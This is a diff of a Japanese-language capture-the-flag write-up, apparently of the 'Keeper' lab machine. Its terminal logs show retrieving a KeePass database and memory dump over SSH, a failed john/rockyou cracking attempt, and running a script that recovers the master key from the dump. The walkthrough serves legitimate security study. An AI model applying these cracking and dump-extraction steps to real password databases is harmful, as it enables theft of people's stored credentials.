@@ -64,11 +64,9 @@ lnorgaard@keeper:~$ cat user.txt
 lnorgaard@keeper:~$ ls
 RT30000.zip  user.txt
 
-
 lnorgaard@keeper:~$ exit
 logout
 Connection to 10.129.190.164 closed.
-
 
 └─$ scp lnorgaard@10.129.190.164:/home/lnorgaard/RT30000.zip .
 lnorgaard@10.129.190.164's password: 
@@ -82,10 +80,8 @@ Archive:  RT30000.zip
   inflating: KeePassDumpFull.dmp     
  extracting: passcodes.kdbx
 
-
 └─$ file KeePassDumpFull.dmp                                                                                 
-KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type
-                                                                                                                                                                                                                                            
+KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type            
 
 └─$ file passcodes.kdbx     
 passcodes.kdbx: Keepass password database 2.x KDBX
@@ -96,7 +92,6 @@ passcodes.kdbx: Keepass password database 2.x KDBX
 パスワードをクラックしてみたが、失敗．．．
 ```sh
 └─$ keepass2john passcodes.kdbx > keepass.txt
-
 
 └─$ john --wordlist /usr/share/wordlists/rockyou.txt --format=keepass keepass.txt
 Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
@@ -128,7 +123,6 @@ Saving to: ‘keepass_dump.py’
 keepass_dump.py                                            100%[========================================================================================================================================>]  14.60K  --.-KB/s    in 0s      
 
 2025-07-12 10:30:43 (77.3 MB/s) - ‘keepass_dump.py’ saved [14948/14948]
-
 
 └─$ python3.13 keepass_dump.py -f KeePassDumpFull.dmp 
 [*] Searching for masterkey characters
